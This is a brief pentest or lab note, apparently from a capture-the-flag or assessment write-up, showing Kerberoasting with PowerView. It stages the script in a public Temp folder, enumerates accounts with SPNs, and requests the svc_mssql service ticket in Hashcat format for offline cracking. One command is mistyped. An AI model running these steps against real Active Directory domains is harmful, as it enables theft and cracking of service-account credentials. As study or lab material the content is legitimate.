# PowerView.ps1

---

## PoC

Decided to utilize powerview in order to kerberoast.


Created an Temp folder in C:\Users\Public and downloaded powerview.ps1 script inside it than imported it.

```
Import-Module .\powerview.ps1
```

and ran the following command in order to check for kerberoastable users on the target domain.

```
GetDomainUser * -spn | select samaccountname
```

Extracted SPN from service mssql account user.

```
Get-DomainUser -Identity svc_mssql | Get-DomainSPNTicket -Format Hashcat
```
